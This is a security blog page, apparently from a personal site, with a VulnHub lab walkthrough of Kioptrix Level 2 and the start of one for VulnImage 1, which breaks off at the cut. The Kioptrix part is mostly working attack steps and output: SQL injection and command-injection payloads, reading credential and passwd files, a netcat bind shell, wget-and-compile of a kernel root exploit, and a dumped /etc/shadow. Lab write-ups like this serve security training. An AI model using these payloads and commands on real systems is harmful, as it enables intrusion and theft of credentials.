@@ -1,0 +1,2153 @@
+
+<!DOCTYPE html>
+<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
+<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
+<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
+<head>
+  <meta charset="utf-8">
+  <title>0x73696e65</title>
+  <meta name="author" content="Norbert Szetei">
+
+  
+  <meta name="description" content="Image: Kioptrix: Level 1.1 (#2) Nmap output: 1
+2
+3
+4
+5
+6
+7
+8
+PORT STATE SERVICE VERSION
+22/tcp open ssh OpenSSH 3.9p1 (protocol 1.99)
+80/tcp open &hellip;">
+  
+
+  <!-- http://t.co/dKP3o1e -->
+  <meta name="HandheldFriendly" content="True">
+  <meta name="MobileOptimized" content="320">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  
+  <link rel="canonical" href="http://73696e65.github.io/posts/4/">
+  <link href="/favicon.png" rel="icon">
+  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
+  <link href="/atom.xml" rel="alternate" title="0x73696e65" type="application/atom+xml">
+  <script src="/javascripts/modernizr-2.0.js"></script>
+  <script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
+  <script>!window.jQuery && document.write(unescape('%3Cscript src="/javascripts/libs/jquery.min.js"%3E%3C/script%3E'))</script>
+  <script src="/javascripts/octopress.js" type="text/javascript"></script>
+  <!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
+<link href="//fonts.googleapis.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+<link href="//fonts.googleapis.com/css?family=PT+Sans:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+
+  
+  <script type="text/javascript">
+    var _gaq = _gaq || [];
+    _gaq.push(['_setAccount', 'UA-64260520-1']);
+    _gaq.push(['_setDomainName','github.io']);
+    _gaq.push(['_trackPageview']);
+
+    (function() {
+      var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
+      ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
+      var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
+    })();
+  </script>
+
+
+</head>
+
+<body    class="collapse-sidebar sidebar-footer" >
+  <header role="banner"><hgroup>
+  <h1><a href="/">0x73696e65</a></h1>
+  
+    <h2>information security notes</h2>
+  
+</hgroup>
+
+</header>
+  <nav role="navigation"><ul class="subscription" data-subscription="rss">
+  <li><a href="/atom.xml" rel="subscribe-rss" title="subscribe via RSS">RSS</a></li>
+  
+</ul>
+  
+<form action="https://www.google.com/search" method="get">
+  <fieldset role="search">
+    <input type="hidden" name="sitesearch" value="73696e65.github.io">
+    <input class="search" type="text" name="q" results="0" placeholder="Search"/>
+  </fieldset>
+</form>
+  
+<ul class="main-navigation">
+  <li><a href="/">Blog</a></li>
+  <li><a href="/blog/archives">Archives</a></li>
+</ul>
+
+</nav>
+  <div id="main">
+    <div id="content">
+      <div class="blog-index">
+  
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/blog/2015/05/11/kioptrix-level-2/">Kioptrix: Level 2</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+<time class='entry-date' datetime='2015-05-11T19:15:08+02:00'><span class='date'><span class='date-month'>May</span> <span class='date-day'>11</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>7:15 pm</span></time>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><p>Image: <a href="https://www.vulnhub.com/entry/kioptrix-level-11-2,23/">Kioptrix: Level 1.1 (#2)</a></p>
+
+<p>Nmap output:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>PORT     STATE SERVICE  VERSION
+</span><span class='line'>22/tcp   open  ssh      OpenSSH 3.9p1 (protocol 1.99)
+</span><span class='line'>80/tcp   open  http     Apache httpd 2.0.52 ((CentOS))
+</span><span class='line'>111/tcp  open  rpcbind  2 (RPC #100000)
+</span><span class='line'>443/tcp  open  ssl/http Apache httpd 2.0.52 ((CentOS))
+</span><span class='line'>631/tcp  open  ipp      CUPS 1.1
+</span><span class='line'>3306/tcp open  mysql    MySQL (unauthorized)
+</span><span class='line'>MAC Address: 00:0C:29:53:19:4C (VMware)</span></code></pre></td></tr></table></div></figure>
+
+
+<p>We connect to the web page and log in using username / password (SQLi):</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>test' or '1'='1</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Now we got the access to the &ldquo;Basic Administrative Web Console&rdquo;. Trying command
+injection, we found out that we can inject arbitrary command and execute under
+web user privileges.</p>
+
+<p>Request / response example:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>POST /pingit.php HTTP/1.1
+</span><span class='line'>Host: 192.168.80.144
+</span><span class='line'>User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:37.0) Gecko/20100101 Firefox/37.0
+</span><span class='line'>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+</span><span class='line'>Accept-Language: en-US,en;q=0.5
+</span><span class='line'>Accept-Encoding: gzip, deflate
+</span><span class='line'>DNT: 1
+</span><span class='line'>Referer: http://192.168.80.144/index.php
+</span><span class='line'>Connection: keep-alive
+</span><span class='line'>Content-Type: application/x-www-form-urlencoded
+</span><span class='line'>Content-Length: 45
+</span><span class='line'>
+</span><span class='line'>ip=127.0.0.1 %26%26 cat /etc/passwd&submit=submit</span></code></pre></td></tr></table></div></figure>
+
+
+
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+<span class='line-number'>41</span>
+<span class='line-number'>42</span>
+<span class='line-number'>43</span>
+<span class='line-number'>44</span>
+<span class='line-number'>45</span>
+<span class='line-number'>46</span>
+<span class='line-number'>47</span>
+<span class='line-number'>48</span>
+<span class='line-number'>49</span>
+<span class='line-number'>50</span>
+<span class='line-number'>51</span>
+<span class='line-number'>52</span>
+<span class='line-number'>53</span>
+<span class='line-number'>54</span>
+<span class='line-number'>55</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>HTTP/1.1 200 OK
+</span><span class='line'>Date: Sat, 09 May 2015 15:02:56 GMT
+</span><span class='line'>Server: Apache/2.0.52 (CentOS)
+</span><span class='line'>X-Powered-By: PHP/4.3.9
+</span><span class='line'>Content-Length: 2187
+</span><span class='line'>Connection: close
+</span><span class='line'>Content-Type: text/html; charset=UTF-8
+</span><span class='line'>
+</span><span class='line'>127.0.0.1 && cat /etc/passwd&lt;pre>PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
+</span><span class='line'>64 bytes from 127.0.0.1: icmp_seq=0 ttl=64 time=0.008 ms
+</span><span class='line'>64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.015 ms
+</span><span class='line'>64 bytes from 127.0.0.1: icmp_seq=2 ttl=64 time=0.015 ms
+</span><span class='line'>
+</span><span class='line'>--- 127.0.0.1 ping statistics ---
+</span><span class='line'>3 packets transmitted, 3 received, 0% packet loss, time 1999ms
+</span><span class='line'>rtt min/avg/max/mdev = 0.008/0.012/0.015/0.005 ms, pipe 2
+</span><span class='line'>root:x:0:0:root:/root:/bin/bash
+</span><span class='line'>bin:x:1:1:bin:/bin:/sbin/nologin
+</span><span class='line'>daemon:x:2:2:daemon:/sbin:/sbin/nologin
+</span><span class='line'>adm:x:3:4:adm:/var/adm:/sbin/nologin
+</span><span class='line'>lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
+</span><span class='line'>sync:x:5:0:sync:/sbin:/bin/sync
+</span><span class='line'>shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
+</span><span class='line'>halt:x:7:0:halt:/sbin:/sbin/halt
+</span><span class='line'>mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
+</span><span class='line'>news:x:9:13:news:/etc/news:
+</span><span class='line'>uucp:x:10:14:uucp:/var/spool/uucp:/sbin/nologin
+</span><span class='line'>operator:x:11:0:operator:/root:/sbin/nologin
+</span><span class='line'>games:x:12:100:games:/usr/games:/sbin/nologin
+</span><span class='line'>gopher:x:13:30:gopher:/var/gopher:/sbin/nologin
+</span><span class='line'>ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin
+</span><span class='line'>nobody:x:99:99:Nobody:/:/sbin/nologin
+</span><span class='line'>dbus:x:81:81:System message bus:/:/sbin/nologin
+</span><span class='line'>vcsa:x:69:69:virtual console memory owner:/dev:/sbin/nologin
+</span><span class='line'>rpm:x:37:37::/var/lib/rpm:/sbin/nologin
+</span><span class='line'>haldaemon:x:68:68:HAL daemon:/:/sbin/nologin
+</span><span class='line'>netdump:x:34:34:Network Crash Dump user:/var/crash:/bin/bash
+</span><span class='line'>nscd:x:28:28:NSCD Daemon:/:/sbin/nologin
+</span><span class='line'>sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin
+</span><span class='line'>rpc:x:32:32:Portmapper RPC user:/:/sbin/nologin
+</span><span class='line'>mailnull:x:47:47::/var/spool/mqueue:/sbin/nologin
+</span><span class='line'>smmsp:x:51:51::/var/spool/mqueue:/sbin/nologin
+</span><span class='line'>rpcuser:x:29:29:RPC Service User:/var/lib/nfs:/sbin/nologin
+</span><span class='line'>nfsnobody:x:65534:65534:Anonymous NFS User:/var/lib/nfs:/sbin/nologin
+</span><span class='line'>pcap:x:77:77::/var/arpwatch:/sbin/nologin
+</span><span class='line'>apache:x:48:48:Apache:/var/www:/sbin/nologin
+</span><span class='line'>squid:x:23:23::/var/spool/squid:/sbin/nologin
+</span><span class='line'>webalizer:x:67:67:Webalizer:/var/www/usage:/sbin/nologin
+</span><span class='line'>xfs:x:43:43:X Font Server:/etc/X11/fs:/sbin/nologin
+</span><span class='line'>ntp:x:38:38::/etc/ntp:/sbin/nologin
+</span><span class='line'>pegasus:x:66:65:tog-pegasus OpenPegasus WBEM/CIM services:/var/lib/Pegasus:/sbin/nologin
+</span><span class='line'>mysql:x:27:27:MySQL Server:/var/lib/mysql:/bin/bash
+</span><span class='line'>john:x:500:500::/home/john:/bin/bash
+</span><span class='line'>harold:x:501:501::/home/harold:/bin/bash
+</span><span class='line'>&lt;/pre></span></code></pre></td></tr></table></div></figure>
+
+
+<p>Web server fingerprints:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>+ Server: Apache/2.0.52 (CentOS)
+</span><span class='line'>+ Retrieved x-powered-by header: PHP/4.3.9</span></code></pre></td></tr></table></div></figure>
+
+
+<p>We don&rsquo;t have writable access under DocumentRoot. Looking to different
+directories, we found the netcat source remains.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>drwxrwxrwx  7 100 users 4096 Oct  8  2009 /usr/src/netcat-0.7.1
+</span><span class='line'>drwxrwxrwx  3 100 users 4096 Oct  8  2009 /usr/src/netcat-0.7.1/doc
+</span><span class='line'>drwxrwxrwx  2 100 users 4096 Oct  8  2009 /usr/src/netcat-0.7.1/doc/drafts
+</span><span class='line'>drwxrwxrwx  2 100 users 4096 Oct  8  2009 /usr/src/netcat-0.7.1/po
+</span><span class='line'>drwxrwxrwx  3 100 users 4096 Oct  8  2009 /usr/src/netcat-0.7.1/lib
+</span><span class='line'>drwxrwxrwx  2 100 users 4096 Oct  8  2009 /usr/src/netcat-0.7.1/lib/contrib
+</span><span class='line'>drwxrwxrwx  2 100 users 4096 Oct  8  2009 /usr/src/netcat-0.7.1/src
+</span><span class='line'>drwxrwxrwx  2 100 users 4096 Oct  8  2009 /usr/src/netcat-0.7.1/m4
+</span><span class='line'>drwxrwxr-x  5 root sys 4096 Oct  7  2009 /etc/cups
+</span><span class='line'>drwxr-xrwx  4 root root 4096 May  9 12:11 /tmp
+</span><span class='line'>drwxrwxrwt  2 root root 4096 May  9 10:17 /tmp/.ICE-unix
+</span><span class='line'>drwxrwxrwt  2 root root 4096 May  9 10:18 /tmp/.font-unix</span></code></pre></td></tr></table></div></figure>
+
+
+<p>So there should be netcat installed, we will need this information later.</p>
+
+<p>We can read index.php for mysql credentials:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>ip=127.0.0.1 %26%26 cat index.php&submit=submit
+</span><span class='line'>..
+</span><span class='line'>&lt;?php
+</span><span class='line'>  mysql_connect("localhost", "john", "hiroshima") or die(mysql_error());
+</span><span class='line'>  //print "Connected to MySQL&lt;br />";
+</span><span class='line'>  mysql_select_db("webapp");
+</span><span class='line'>  
+</span><span class='line'>  if ($_POST['uname'] != ""){
+</span><span class='line'>      $username = $_POST['uname'];
+</span><span class='line'>      $password = $_POST['psw'];
+</span><span class='line'>      $query = "SELECT * FROM users WHERE username = '$username' AND password='$password'";
+</span><span class='line'>      //print $query."&lt;br>";
+</span><span class='line'>      $result = mysql_query($query);
+</span><span class='line'>
+</span><span class='line'>      $row = mysql_fetch_array($result);
+</span><span class='line'>      //print "ID: ".$row['id']."&lt;br />";
+</span><span class='line'>  }
+</span><span class='line'>
+</span><span class='line'>?></span></code></pre></td></tr></table></div></figure>
+
+
+<p>The john&rsquo;s password doesn&rsquo;t work for ssh, but at least we can extract more from
+mysql database:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>ip=127.0.0.1 %26%26 echo show databases|mysql -ujohn -phiroshima&submit=submit
+</span><span class='line'>Database
+</span><span class='line'>mysql
+</span><span class='line'>test
+</span><span class='line'>webapp
+</span><span class='line'>
+</span><span class='line'>ip=127.0.0.1 %26%26 echo 'use webapp; show tables'|mysql -ujohn -phiroshima&submit=submit
+</span><span class='line'>id    username    password
+</span><span class='line'>1 admin   5afac8d85f
+</span><span class='line'>2 john    66lajGGbla</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Again, the passwords don&rsquo;t work for ssh.</p>
+
+<p>We find netcat and use it to bind a shell, then we try to root the box:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>ip=127.0.0.1 %26%26 find / -iname \*netcat\*&submit=submit
+</span><span class='line'>..
+</span><span class='line'>/usr/share/zsh/4.2.0/functions/_netcat
+</span><span class='line'>/usr/local/info/netcat.info
+</span><span class='line'>/usr/local/share/locale/sk/LC_MESSAGES/netcat.mo
+</span><span class='line'>/usr/local/share/locale/it/LC_MESSAGES/netcat.mo
+</span><span class='line'>/usr/local/man/man1/netcat.1
+</span><span class='line'>/usr/local/bin/netcat
+</span><span class='line'>/usr/src/netcat-0.7.1
+</span><span class='line'>/usr/src/netcat-0.7.1/doc/netcat.1
+</span><span class='line'>/usr/src/netcat-0.7.1/doc/netcat.info
+</span><span class='line'>/usr/src/netcat-0.7.1/doc/netcat.texi
+</span><span class='line'>/usr/src/netcat-0.7.1/doc/netcat.pod
+</span><span class='line'>/usr/src/netcat-0.7.1/po/netcat.pot
+</span><span class='line'>/usr/src/netcat-0.7.1/src/netcat.c
+</span><span class='line'>/usr/src/netcat-0.7.1/src/netcat.h
+</span><span class='line'>/usr/src/netcat-0.7.1/src/netcat.o
+</span><span class='line'>/usr/src/netcat-0.7.1/src/netcat</span></code></pre></td></tr></table></div></figure>
+
+
+
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>ip=127.0.0.1 %26%26 /usr/local/bin/netcat -e /bin/sh -l -p 1337&submit=submit</span></code></pre></td></tr></table></div></figure>
+
+
+
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:/var/www# nc 192.168.80.144 1337
+</span><span class='line'>
+</span><span class='line'>id
+</span><span class='line'>uid=48(apache) gid=48(apache) groups=48(apache)
+</span><span class='line'>
+</span><span class='line'>uname -a
+</span><span class='line'>Linux kioptrix.level2 2.6.9-55.EL #1 Wed May 2 13:52:16 EDT 2007 i686 i686 i386 GNU/Linux</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Luckily, exploitdb contains local root exploit with exactly this version of kernel:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:/usr/share/exploitdb# grep -irn '2.6.9-55.EL' *
+</span><span class='line'>platforms/linux/local/9542.c:7:** CentOS 4.4(2.6.9-42.ELsmp), CentOS 4.5(2.6.9-55.ELsmp),</span></code></pre></td></tr></table></div></figure>
+
+
+<p>As our last step, we download and compile this exploit
+<a href="https://www.exploit-db.com/exploits/9542/">https://www.exploit-db.com/exploits/9542/</a> .</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+<span class='line-number'>41</span>
+<span class='line-number'>42</span>
+<span class='line-number'>43</span>
+<span class='line-number'>44</span>
+<span class='line-number'>45</span>
+<span class='line-number'>46</span>
+<span class='line-number'>47</span>
+<span class='line-number'>48</span>
+<span class='line-number'>49</span>
+<span class='line-number'>50</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>cd /tmp/
+</span><span class='line'>wget https://www.exploit-db.com/download/9542 -O 9542.c --no-check-certificate
+</span><span class='line'>
+</span><span class='line'>gcc 9542.c
+</span><span class='line'>./a.out
+</span><span class='line'>sh: no job control in this shell
+</span><span class='line'>sh-3.00# id
+</span><span class='line'>uid=0(root) gid=0(root) groups=48(apache)
+</span><span class='line'>sh-3.00# 
+</span><span class='line'>
+</span><span class='line'>sh-3.00# cat /etc/shadow
+</span><span class='line'>root:$1$FTpMLT88$VdzDQTTcksukSKMLRSVlc.:14529:0:99999:7:::
+</span><span class='line'>bin:*:14525:0:99999:7:::
+</span><span class='line'>daemon:*:14525:0:99999:7:::
+</span><span class='line'>adm:*:14525:0:99999:7:::
+</span><span class='line'>lp:*:14525:0:99999:7:::
+</span><span class='line'>sync:*:14525:0:99999:7:::
+</span><span class='line'>shutdown:*:14525:0:99999:7:::
+</span><span class='line'>halt:*:14525:0:99999:7:::
+</span><span class='line'>mail:*:14525:0:99999:7:::
+</span><span class='line'>news:*:14525:0:99999:7:::
+</span><span class='line'>uucp:*:14525:0:99999:7:::
+</span><span class='line'>operator:*:14525:0:99999:7:::
+</span><span class='line'>games:*:14525:0:99999:7:::
+</span><span class='line'>gopher:*:14525:0:99999:7:::
+</span><span class='line'>ftp:*:14525:0:99999:7:::
+</span><span class='line'>nobody:*:14525:0:99999:7:::
+</span><span class='line'>dbus:!!:14525:0:99999:7:::
+</span><span class='line'>vcsa:!!:14525:0:99999:7:::
+</span><span class='line'>rpm:!!:14525:0:99999:7:::
+</span><span class='line'>haldaemon:!!:14525:0:99999:7:::
+</span><span class='line'>netdump:!!:14525:0:99999:7:::
+</span><span class='line'>nscd:!!:14525:0:99999:7:::
+</span><span class='line'>sshd:!!:14525:0:99999:7:::
+</span><span class='line'>rpc:!!:14525:0:99999:7:::
+</span><span class='line'>mailnull:!!:14525:0:99999:7:::
+</span><span class='line'>smmsp:!!:14525:0:99999:7:::
+</span><span class='line'>rpcuser:!!:14525:0:99999:7:::
+</span><span class='line'>nfsnobody:!!:14525:0:99999:7:::
+</span><span class='line'>pcap:!!:14525:0:99999:7:::
+</span><span class='line'>apache:!!:14525:0:99999:7:::
+</span><span class='line'>squid:!!:14525:0:99999:7:::
+</span><span class='line'>webalizer:!!:14525:0:99999:7:::
+</span><span class='line'>xfs:!!:14525:0:99999:7:::
+</span><span class='line'>ntp:!!:14525:0:99999:7:::
+</span><span class='line'>pegasus:!!:14525:0:99999:7:::
+</span><span class='line'>mysql:!!:14525::::::
+</span><span class='line'>john:$1$wk7kHI5I$2kNTw6ncQQCecJ.5b8xTL1:14525:0:99999:7:::
+</span><span class='line'>harold:$1$7d.sVxgm$3MYWsHDv0F/LP.mjL9lp/1:14529:0:99999:7:::
+</span><span class='line'>sh-3.00#</span></code></pre></td></tr></table></div></figure>
+
+</div>
+  
+  
+
+
+    </article>
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/blog/2015/05/10/vulnimage-1/">VulnImage: 1</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+<time class='entry-date' datetime='2015-05-10T15:18:05+02:00'><span class='date'><span class='date-month'>May</span> <span class='date-day'>10</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>3:18 pm</span></time>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><p>Image: <a href="https://www.vulnhub.com/entry/vulnimage-1,39/">VulnImage: 1</a></p>
+
+<p>Nmap output:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>PORT     STATE SERVICE     VERSION
+</span><span class='line'>22/tcp   open  ssh         OpenSSH 5.1p1 Debian 5 (protocol 2.0)
+</span><span class='line'>25/tcp   open  smtp        Exim smtpd 4.50
+</span><span class='line'>80/tcp   open  http        Apache httpd 2.2.9 ((Debian) PHP/5.2.6-1+lenny9 with Suhosin-Patch)
+</span><span class='line'>139/tcp  open  netbios-ssn Samba smbd 3.X (workgroup: WORKGROUP)
+</span><span class='line'>445/tcp  open  netbios-ssn Samba smbd 3.X (workgroup: WORKGROUP)
+</span><span class='line'>3306/tcp open  mysql       MySQL 5.0.51a-24+lenny4
+</span><span class='line'>7777/tcp open  cbt?</span></code></pre></td></tr></table></div></figure>
+
+
+<p>With dirb we found a few interesting directories (repo, admin, profiles),
+directory listing is enabled:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>---- Scanning URL: http://192.168.80.143/ ----
+</span><span class='line'>+ http://192.168.80.143/index (CODE:200|SIZE:71)    
+</span><span class='line'>+ http://192.168.80.143/view (CODE:200|SIZE:166)    
+</span><span class='line'>==> DIRECTORY: http://192.168.80.143/admin/    
+</span><span class='line'>==> DIRECTORY: http://192.168.80.143/profiles/    
+</span><span class='line'>==> DIRECTORY: http://192.168.80.143/repo/    
+</span><span class='line'>+ http://192.168.80.143/myblog (CODE:200|SIZE:736)    
+</span><span class='line'>+ http://192.168.80.143/server-status (CODE:403|SIZE:332)</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Submitting the quote gives an error SQL message:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>http://192.168.80.143/admin/profile.php
+</span><span class='line'>Username: '
+</span><span class='line'>Password a
+</span><span class='line'>
+</span><span class='line'>... 
+</span><span class='line'>SELECT * FROM blog_users WHERE poster = ''' AND password = 'a'</span></code></pre></td></tr></table></div></figure>
+
+
+<p>After a few minutes of playing with requests we realize that we can create
+files in format &lsquo;username-fname&rsquo; and with the content of &lsquo;sig&rsquo; parameter.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
